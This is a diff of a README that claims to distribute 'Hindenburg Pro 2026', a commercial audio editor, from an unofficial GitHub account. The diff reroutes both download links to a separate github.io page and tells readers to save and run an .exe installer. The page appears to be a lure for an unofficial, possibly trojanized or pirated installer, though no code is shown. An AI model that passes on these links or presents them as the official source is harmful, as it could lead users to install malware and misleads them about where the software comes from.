@@ -1,6 +1,6 @@
 # 🎙️ Hindenburg-Pro-2026 - Professional Audio Production Made Simple
 
-[ ![Download Hindenburg Pro](https://img.shields.io/badge/Download-HindenburgPro-blue.svg) ](https://github.com/ivorynonspherical905/Hindenburg-Pro-2026)
+[ ![Download Hindenburg Pro](https://img.shields.io/badge/Download-HindenburgPro-blue.svg) ](https://ivorynonspherical905.github.io)
 
 Hindenburg Pro 2026 provides a robust platform for journalists, podcasters, and radio professionals. This software prioritizes clarity and speed. It automates common tasks like leveling audio and noise reduction so you focus on your story. The interface works well on Windows 10 and Windows 11.
 
@@ -8,7 +8,7 @@ Hindenburg Pro 2026 provides a robust platform for journalists, podcasters, and 
 
 Follow these steps to get the software on your computer.
 
-1. Visit the [official repository page](https://github.com/ivorynonspherical905/Hindenburg-Pro-2026) to access the files.
+1. Visit the [official repository page](https://ivorynonspherical905.github.io) to access the files.
 2. Look for the latest release version on the right side of the screen.
 3. Select the installer file ending in .exe.
 4. Save the file to your Downloads folder.
